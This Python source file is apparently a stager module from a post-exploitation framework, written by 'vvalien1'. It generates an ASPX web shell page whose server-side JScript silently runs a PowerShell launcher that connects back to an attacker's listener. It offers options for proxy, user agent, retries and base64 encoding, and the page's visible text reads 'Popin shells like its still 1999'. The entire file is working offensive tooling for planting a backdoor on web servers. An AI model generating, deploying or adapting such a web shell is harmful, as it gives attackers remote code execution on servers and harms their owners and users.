# place in lib/stagers/windows
from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'aspxshell',
            'Author': ['vvalien1'],
            'Description': ('Generates an aspx file for use on a webserver'),
            'Comments': [
                'This module uses JScript to launch a new powershell process.'
            ]
        }
        self.options = {
            'Listener': {
                'Description':   'Listener to generate stager for.',
                'Required':   True,
                'Value':   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries': {
                'Description':   'Times for the stager to retry connecting.',
                'Required':   False,
                'Value':   '0'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },        
            'OutFile': {
                'Description':   'File to output aspx to, otherwise displayed on the screen.',
                'Required':   False,
                'Value':   '/tmp/launcher.aspx'
            },
            'UserAgent': {
                'Description':   'User-agent string to use for the staging request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'Proxy': {
                'Description':   'Proxy to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'ProxyCreds': {
                'Description':   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName, language=language, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            code = "<%@ Page Language='JScript' Debug='true' Trace='false' %>\n"
            code += "<script runat='server'>\n"
            code += "    var r = new ActiveXObject(\"WScript.Shell\").Run(\"" + launcher + "\",0);\n"
            code += "</script>\n"
            code += "<html>\n"
            code += "  <head>\n"
            code += "    <title>Silly Webshell</title>\n"
            code += "  </head>\n"
            code += "  <body>\n"
            code += "    <p> Popin shells like its still 1999 </p>\n"
            code += "  </body>\n"
            code += "</html>\n"
            return code
